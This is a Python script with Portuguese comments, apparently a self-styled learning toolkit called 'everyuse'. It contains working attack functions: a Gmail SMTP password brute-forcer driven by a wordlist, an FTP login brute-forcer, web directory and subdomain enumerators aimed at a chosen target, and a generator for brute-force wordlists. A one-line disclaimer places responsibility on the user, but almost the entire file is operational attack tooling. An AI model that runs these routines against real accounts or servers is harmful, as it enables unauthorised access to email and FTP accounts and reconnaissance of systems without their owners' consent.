#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Codado por: Lucas Simoni <lucas.simoni10@gmail.com>
#
# Programa com finalidade de aprendizado.
# Todas as suas ações utilizando o everyuse são responsabilidades SUA.

#Importar as bibliotecas necessarias
import socket, requests, ftplib, smtplib

def gmail(email, wordlist):
    arq = open(wordlist, "rb")
    for linha in arq.readlines():
        try:
            senha = linha.strip().decode()
            print('Testando o login com a senha:', senha)
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, senha)

            print('\033[32m\033[1mLogin efetuado com sucesso!\033[0;0m')
            print('\033[32m\033[1mEmail:',email,'\033[0;0m')
            print('\033[32m\033[1mSenha:',senha,'\033[0;0m')
            server.close()
            break
        except Exception as verif:
            if str(verif).startswith("(535, b'5.7.8 Username and Password not accepted."):
                server.close()
                continue
            elif str(verif).startswith("(534, b'5.7.9"):
                server.close()
                continue
            elif str(verif).startswith("(534, b'5.7.14"):
                server.close()
                print(str(verif))
                print('\033[32m\033[1mLogin efetuado com sucesso!\033[0;0m')
                print('\033[32m\033[1mEmail:', email, '\033[0;0m')
                print('\033[32m\033[1mSenha:', senha, '\033[0;0m')
                break

def ftp(wordlist, user, alvo):
    arq = open(wordlist, 'rb')
    for senha in arq.readlines():
        senha = senha.decode()
        try:
            c = ftplib.FTP(alvo)
            c.login(user, senha)
            print('\033[32m\033[1mConexão estabelecida:', str(alvo) + ':21\033[0;0m')
            print('\033[32m\033[1mUser:', user+ '\033[0;0m')
            print('\033[32m\033[1mPass:', senha+ '\033[0;0m')
            break
        except ftplib.error_perm:
            print('\033[31m\033[1mConexão recusada:', str(alvo) + ':21\033[0;0m')
            print('\033[31m\033[1mUser:', user+ '\033[0;0m')
            print('\033[31m\033[1mPass:', senha+ '\033[0;0m')

def diretorio(site, arq):
    wordlist = open(arq, 'rb')
    listapalavra = []
    for linha in wordlist.readlines():
        listapalavra.append(linha.strip().decode())
    lista = []
    listatemp = []
    ip = site.split('/')
    ip = socket.gethostbyname(ip[2])
    print('\n\033[32m+\033[0;1m--------------------------\033[32m+\033[0;0m')
    print('\033[1mIP do alvo:\033[0;0m', ip)
    print('\033[1mDominio:\033[0;0m', site)
    print('\033[1mWordlist:\033[0;0m', arq)
    print('\033[32m+\033[0;1m--------------------------\033[32m+\033[0;0m')
    for palavra in listapalavra:                                    #Para cada palavra na wordlist
        try:                                                        #Tente
            sitewdir = site+palavra+'/'                             #Site com diretorio vai para var sitewdir
            req = requests.get(sitewdir)                            #Faz a requisição para testar
            if req.status_code < 400 and req.status_code >= 200:    #Se a requisição não for 400+ ou 200- continua
                if sitewdir == site+'/':                            #Se o site for http://site.com//
                    continue                                        #Continua
                else:                                               #Se não for, o site é valido.. então
                    print('» Encontramos:', sitewdir, '[%s]' % str(req.status_code)) #Printa
                    lista.append(sitewdir)                          #Adiciona na lista dos diretorios encontrados
                    listatemp.append(sitewdir)                      #Adiciona em uma lista temporaria
        except:                                                     #Se der algo errado:
            continue                                                #Continue
    print('Procurando por subdiretorios.')                          #Printa
    for siteencontrado in listatemp:                                #Para cada site encontrado anteriormente:
        for palavra in listapalavra:                                #Para cada palavra da wordlist
            try:                                                    #Tente
                sitewdir = siteencontrado+palavra+'/'               #Site encontrado com diretorio na var sitewdir
                req = requests.get(sitewdir)                        #Testa mandando uma requisição
                if req.status_code < 400 and req.status_code >= 200:#Se a requisição não for 400+ ou 200- continua
                    if sitewdir == siteencontrado+'/':              #Se o site for http://site.com//
                        continue                                    #Continue
                    else:                                           #Se não for, o site é valido.. então
                        print('» Encontramos:', sitewdir, '[%s]' % str(req.status_code))  # Printa
                        lista.append(sitewdir)                      #Adiciona na lista dos diretorios encontrados
                        listatemp.append(sitewdir)                  #Adiciona em uma lista temporaria
            except:                                                 #Se der algo errado:
                continue                                            #Continue

def subdominio(ip, dominio, arq):
    wordlist = open(arq, 'rb')
    print('\n\033[32m+\033[0;1m--------------------------\033[32m+\033[0;0m')
    print('\033[1mIP do alvo:\033[0;0m', ip)
    print('\033[1mDominio:\033[0;0m', dominio)
    print('\033[1mWordlist:\033[0;0m', arq)
    print('\033[32m+\033[0;1m--------------------------\033[32m+\033[0;0m')
    for subdominio in wordlist.readlines():
        subdom = subdominio.strip().decode()
        try:
            req = requests.get('http://'+subdom+'.'+dominio)
            if req.status_code == 200:
                ip = socket.gethostbyname(subdom+'.'+dominio)
                print('» Encontramos:', 'http://'+subdom+'.'+dominio, '(%s)' % ip)
            elif req.status_code < 400 and req.status_code >= 300:
                ip = socket.gethostbyname(subdom+'.'+dominio)
                print('» Encontramos:', 'http://' + subdom + '.' + dominio, '(%s)' % ip, '[REDIRECIONAVEL:%s]' % str(req.status_code))
        except:
            continue

def gerarwl(adic, carac, qtd, nomesaida):
    arquivo = open(nomesaida, 'w')
    passw = [char for char in carac]
    for n in range(0, qtd-1):
        passw = [char+oth for char in carac for oth in passw]

    for sen in passw:
        if adic == '' or adic == ' ':
            arquivo.write(adic + sen + '\n')
        else:
            arquivo.write(adic+sen+'\n')
            arquivo.write(sen+adic+'\n')
    arquivo.close()